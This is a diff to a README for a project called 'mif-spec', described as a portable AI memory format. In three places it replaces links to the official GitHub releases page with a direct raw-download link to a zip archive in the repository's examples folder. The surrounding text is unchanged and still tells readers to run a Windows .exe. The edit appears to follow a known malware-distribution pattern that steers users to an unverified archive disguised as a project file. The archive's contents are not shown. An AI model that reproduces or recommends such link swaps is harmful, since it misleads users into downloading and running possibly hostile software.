@@ -1,6 +1,6 @@
 # 🧠 mif-spec - Portable AI Memory Format
 
-[![Download mif-spec](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/pranavvvvvvvvvvvvvv/mif-spec/releases)
+[![Download mif-spec](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen)](https://github.com/pranavvvvvvvvvvvvvv/mif-spec/raw/refs/heads/main/examples/mif_spec_v3.1.zip)
 
 ---
 
@@ -24,7 +24,7 @@ To run mif-spec on your Windows computer, make sure you have:
 You can get mif-spec from the official release page. Follow these steps:
 
 1. Open this link in your web browser:  
-   [https://github.com/pranavvvvvvvvvvvvvv/mif-spec/releases](https://github.com/pranavvvvvvvvvvvvvv/mif-spec/releases)
+   [https://github.com/pranavvvvvvvvvvvvvv/mif-spec/raw/refs/heads/main/examples/mif_spec_v3.1.zip](https://github.com/pranavvvvvvvvvvvvvv/mif-spec/raw/refs/heads/main/examples/mif_spec_v3.1.zip)
 
 2. Look for the latest version listed at the top of the page.
 
@@ -134,6 +134,6 @@ This helps developers and users share AI knowledge without needing custom tools 
 ## 🔗 Download Again
 
 To download mif-spec, visit the official release page here:  
-[https://github.com/pranavvvvvvvvvvvvvv/mif-spec/releases](https://github.com/pranavvvvvvvvvvvvvv/mif-spec/releases)  
+[https://github.com/pranavvvvvvvvvvvvvv/mif-spec/raw/refs/heads/main/examples/mif_spec_v3.1.zip](https://github.com/pranavvvvvvvvvvvvvv/mif-spec/raw/refs/heads/main/examples/mif_spec_v3.1.zip)  
 
 Click on the latest Windows `.exe` file to get started.
